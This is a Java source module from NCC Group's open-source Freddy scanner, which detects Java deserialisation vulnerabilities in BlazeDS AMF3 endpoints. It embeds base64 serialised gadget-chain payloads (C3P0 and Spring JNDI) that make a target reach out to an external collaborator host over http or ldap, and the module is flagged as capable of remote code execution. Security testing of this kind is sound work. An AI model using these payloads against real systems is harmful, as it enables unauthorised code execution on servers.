// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import java.util.regex.Pattern;
import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the AMF 3 format support of the Java
 * BlazeDS library.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class BlazeDSAMF3Module extends FreddyModuleBase {
	//C3P0WrapperConnPool payload data
	private static final int C3P0WRAP_PAYLOAD_CMD_OFFSET = 1153;
	private static final String C3P0WRAP_PREFIX_B64 = "ChNnY29tLm1jaGFuZ2UudjIuYzNwMC5XcmFwcGVyQ29ubmVjdGlvblBvb2xEYXRhU291cmNlK3VzZXJPdmVycmlkZXNBc1N0cmluZwaXH0hleEFzY2lpU2VyaWFsaXplZE1hcDphY2VkMDAwNTczNzIwMDNkNjM2ZjZkMmU2ZDYzNjg2MTZlNjc2NTJlNzYzMjJlNmU2MTZkNjk2ZTY3MmU1MjY1NjY2NTcyNjU2ZTYzNjU0OTZlNjQ2OTcyNjU2Mzc0NmY3MjI0NTI2NTY2NjU3MjY1NmU2MzY1NTM2NTcyNjk2MTZjNjk3YTY1NjQ2MjE5ODVkMGQxMmFjMjEzMDIwMDA0NGMwMDBiNjM2ZjZlNzQ2NTc4NzQ0ZTYxNmQ2NTc0MDAxMzRjNmE2MTc2NjE3ODJmNmU2MTZkNjk2ZTY3MmY0ZTYxNmQ2NTNiNGMwMDAzNjU2ZTc2NzQwMDE1NGM2YTYxNzY2MTJmNzU3NDY5NmMyZjQ4NjE3MzY4NzQ2MTYyNmM2NTNiNGMwMDA0NmU2MTZkNjU3MTAwN2UwMDAxNGMwMDA5NzI2NTY2NjU3MjY1NmU2MzY1NzQwMDE4NGM2YTYxNzY2MTc4MmY2ZTYxNmQ2OTZlNjcyZjUyNjU2NjY1NzI2NTZlNjM2NTNiNzg3MDcwNzA3MDczNzIwMDE2NmE2MTc2NjE3ODJlNmU2MTZkNjk2ZTY3MmU1MjY1NjY2NTcyNjU2ZTYzNjVlOGM2OWVhMmE4ZTk4ZDA5MDIwMDA0NGMwMDA1NjE2NDY0NzI3Mzc0MDAxMjRjNmE2MTc2NjEyZjc1NzQ2OTZjMmY1NjY1NjM3NDZmNzIzYjRjMDAwYzYzNmM2MTczNzM0NjYxNjM3NDZmNzI3OTc0MDAxMjRjNmE2MTc2NjEyZjZjNjE2ZTY3MmY1Mzc0NzI2OTZlNjczYjRjMDAxNDYzNmM2MTczNzM0NjYxNjM3NDZmNzI3OTRjNmY2MzYxNzQ2OTZmNmU3MTAwN2UwMDA3NGMwMDA5NjM2YzYxNzM3MzRlNjE2ZDY1NzEwMDdlMDAwNzc4NzA3MzcyMDAxMDZhNjE3NjYxMmU3NTc0Njk2YzJlNTY2NTYzNzQ2ZjcyZDk5NzdkNWI4MDNiYWYwMTAzMDAwMzQ5MDAxMTYzNjE3MDYxNjM2OTc0Nzk0OTZlNjM3MjY1NmQ2NTZlNzQ0OTAwMGM2NTZjNjU2ZDY1NmU3NDQzNmY3NTZlNzQ1YjAwMGI2NTZjNjU2ZDY1NmU3NDQ0NjE3NDYxNzQwMDEzNWI0YzZhNjE3NjYxMmY2YzYxNmU2NzJmNGY2MjZhNjU2Mzc0M2I3ODcwMDAwMDAwMDAwMDAwMDAwMDc1NzIwMDEzNWI0YzZhNjE3NjYxMmU2YzYxNmU2NzJlNGY2MjZhNjU2Mzc0M2I5MGNlNTg5ZjEwNzMyOTZjMDIwMDAwNzg3MDAwMDAwMDBhNzA3MDcwNzA3MDcwNzA3MDcwNzA3ODc0MDAwNjQ2NzI2NTY0NjQ3OTc0MDBjOA==";
	private static final String C3P0WRAP_SUFFIX_B64 = "NzQwMDAzNDY2ZjZmOw==";
	private byte[] C3P0WRAP_PAYLOAD;
	
	//SpringPropertyPathFactory payload data
	private static final int SPPF_PAYLOAD_CMD_OFFSET = 111;
	private static final String SPPF_PREFIX_B64 = "CjOBAW9yZy5zcHJpbmdmcmFtZXdvcmsuYmVhbnMuZmFjdG9yeS5jb25maWcuUHJvcGVydHlQYXRoRmFjdG9yeUJlYW4ddGFyZ2V0QmVhbk5hbWUZcHJvcGVydHlQYXRoF2JlYW5GYWN0b3J5BoMR";
	private static final String SPPF_SUFFIX_B64 = "Bgdmb28KE21vcmcuc3ByaW5nZnJhbWV3b3JrLmpuZGkuc3VwcG9ydC5TaW1wbGVKbmRpQmVhbkZhY3Rvcnklc2hhcmVhYmxlUmVzb3VyY2VzCgdDZmxleC5tZXNzYWdpbmcuaW8uQXJyYXlDb2xsZWN0aW9uCQMBBgg=";
	private byte[] SPPF_PAYLOAD;
	
	protected void initialiseModule() {
		setName("BlazeDS-AMF3");
		setPlatform(TargetPlatform.JAVA);
		setModuleIsRCECapable(true);
		setDescriptionCaveats("");
		setRemediationDetail("");
		setSeverity(SeverityRating.HIGH);
		
		//Initialise payload buffers
		C3P0WRAP_PAYLOAD = buildBinaryPayloadBuffer(C3P0WRAP_PREFIX_B64, C3P0WRAP_SUFFIX_B64, true); //Note, this payload isn't actually unicode but is encoded as hex-ascii so requires two bytes space per byte of payload
		SPPF_PAYLOAD = buildBinaryPayloadBuffer(SPPF_PREFIX_B64, SPPF_SUFFIX_B64, false);
		
		//Register active scan payloads (passive scan is handled by BlazeDSPassiveDetectionModule)
		registerActiveScanExceptionPayload(new byte[] {0x0a, 0x13, 0x17, 0x46, 0x72, 0x65, 0x64, 0x64, 0x79, 0x44, 0x65, 0x73, 0x65, 0x72, 0x00}, Pattern.compile("Cannot create class of type ((')|(&#39;))FreddyDeser((')|(&#39;))\\."));
		
		registerActiveScanCollaboratorPayload(PN_C3P0WCP, true);
		registerActiveScanCollaboratorPayload(PN_SPRINGPPF, true);
	}
	
	protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
		switch(payloadName) {
			case PN_C3P0WCP:
				return generateBinaryPayloadWithAscHexCommand(C3P0WRAP_PAYLOAD, C3P0WRAP_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/");
				
			case PN_SPRINGPPF:
				return generateBinaryPayload(SPPF_PAYLOAD, SPPF_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);
		}
		return null;
	}
}
